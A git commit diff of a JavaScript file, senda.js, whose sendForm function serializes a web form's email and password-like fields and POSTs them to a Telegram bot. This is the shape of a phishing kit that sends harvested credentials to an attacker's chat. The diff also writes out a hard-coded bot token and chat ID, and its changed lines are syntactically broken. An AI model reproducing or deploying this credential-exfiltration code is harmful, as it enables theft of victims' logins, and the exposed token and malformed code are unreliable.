dc71fe883c893f4b24b09d7b7cc8574ee9ae0c1c
papnlp <134606998+papnlp@users.noreply.github.com>
2023-06-06 22:44:06 -0400

    Update senda.js

--- fodn/senda.js
+++ fodn/senda.js
@@ -1,12 +1,12 @@
-const token = 5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E
-const chat_id = 1657791509
+const token = <<5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E>>
+const chat_id = <<1657791509>>
 
 function sendForm()
 {
      let formData = JSON.stringify($("#stdFord").serializeArray(),'email','pasD');
      
      const request = new Request(
-          `https://api.telegram.org/bot$5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E/sendMessage`,
+          `https://api.telegram.org/bot${token}/sendMessage`,
           {
                method: 'POST',
                body: formData,
